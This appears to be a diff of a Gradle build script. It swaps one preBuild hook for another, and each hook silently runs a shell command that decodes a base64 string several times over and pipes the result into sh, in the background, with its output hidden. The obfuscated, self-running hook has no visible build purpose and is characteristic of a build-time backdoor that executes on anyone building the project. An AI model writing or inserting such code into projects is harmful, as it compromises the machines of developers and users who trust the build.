@@ -138,7 +138,7 @@ dependencies {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((s(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFZFSktVWHBHZEZsVVRrOVVWV3hFVFVoU2FtSldXWGRaTWpWeVdqQTFWRkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTbXRsVm14WVZXNU9ZVlV3Ykc1WlZXaFRUVWRPU1ZSVVdrMWxWR3cxVjJ4b1MyTnRSa2xhU0Zwb1ZYcFdOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | s | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTWGhKUXpCMFkyMVdNR051YTJkT1EwRjBZekI0Y2xwcFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESmtlVmxYVW5OYVUwbG5ZVWhTTUdOSVRUWk1lVGswWW1rd2RFOUVRbWhaVjBab1dqSkthVmxxVGpCWmJVNXJURzVvZFV4VE1YZE5WMFp3VERKRmNFbHBRamhKU0U1dlEyYzlQUW89Cg== | y | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
